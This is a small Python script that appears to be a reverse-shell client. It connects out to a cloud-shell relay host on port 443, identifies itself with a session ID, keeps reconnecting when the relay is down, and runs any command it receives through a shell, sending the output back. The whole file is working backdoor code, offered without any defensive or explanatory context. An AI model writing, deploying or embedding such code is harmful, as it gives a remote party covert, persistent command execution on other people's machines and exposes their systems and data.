import socket
import threading
import time
import platform
import subprocess

RELAY_HOST = "8080-cs-xxxxx.cloudshell.dev"
RELAY_PORT = 443     # Cloud Shell tunnel
SESSION_ID = "123456"

def execute_command(cmd):
    if cmd == "PING":
        return "PONG"

    elif cmd == "INFO":
        return f"{platform.system()} | {platform.node()}"

    elif cmd == "TIME":
        return time.ctime()

    elif cmd.startswith("ECHO:"):
        return cmd[5:]

    else:
        try:
            return subprocess.check_output(cmd, shell=True, text=True)
        except Exception as e:
            return str(e)

def listen(sock):
    while True:
        try:
            cmd = sock.recv(1024).decode()
            if not cmd:
                break
            print("[CMD]", cmd)
            res = execute_command(cmd)
            sock.send(res.encode())
        except:
            break

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((RELAY_HOST, RELAY_PORT))
            s.send(SESSION_ID.encode())
            print("[✓] Connecté au relais")
            return s
        except:
            print("[X] Relais OFF, retry...")
            time.sleep(5)

def main():
    while True:
        sock = connect()
        t = threading.Thread(target=listen, args=(sock,), daemon=True)
        t.start()
        t.join()
        time.sleep(1)

if __name__ == "__main__":
    main()
